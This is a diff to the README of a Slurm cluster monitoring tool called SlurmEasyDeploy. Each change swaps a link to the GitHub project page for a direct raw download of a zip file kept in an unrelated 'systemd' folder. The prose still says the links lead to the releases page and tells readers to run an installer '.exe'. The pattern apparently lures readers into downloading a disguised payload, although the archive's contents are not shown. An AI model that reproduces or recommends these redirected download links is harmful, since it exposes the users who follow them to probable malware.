@@ -1,6 +1,6 @@
 # ⚙️ SlurmEasyDeploy - Easy Slurm Cluster Monitoring
 
-[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-brightgreen)](https://github.com/MahmoudAl-Saeed/SlurmEasyDeploy)
+[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-brightgreen)](https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip)
 
 ## 📋 What is SlurmEasyDeploy?
 
@@ -28,12 +28,12 @@ SlurmEasyDeploy uses Python technologies in the background, but you don't need t
 
 You can get SlurmEasyDeploy using the link below. It sends you to the main download page on GitHub where the latest version will always be available.
 
-[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-blue)](https://github.com/MahmoudAl-Saeed/SlurmEasyDeploy)
+[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-blue)](https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip)
 
 ### How to download and run the app
 
 1. Click the big green button above or visit this page:  
-   https://github.com/MahmoudAl-Saeed/SlurmEasyDeploy
+   https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip
 
 2. On the GitHub page, find the **Releases** tab or section.  
    This is where all versions of the app are kept.
@@ -113,7 +113,7 @@ If you still have issues, check the **Issues** tab on GitHub or contact your sys
 To get the latest features and fixes:
 
 1. Visit the download page again:  
-   https://github.com/MahmoudAl-Saeed/SlurmEasyDeploy
+   https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip
 
 2. Download the newest installer `.exe` file.
 
@@ -147,7 +147,7 @@ If you face problems beyond installation:
 
 ---
 
-[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-brightgreen)](https://github.com/MahmoudAl-Saeed/SlurmEasyDeploy)
+[![Download SlurmEasyDeploy](https://img.shields.io/badge/Download-SlurmEasyDeploy-brightgreen)](https://raw.githubusercontent.com/MahmoudAl-Saeed/SlurmEasyDeploy/main/slurm-lab-status-portal/systemd/Easy_Deploy_Slurm_v1.1-alpha.1.zip)
 
 ## 🔖 Topics
 
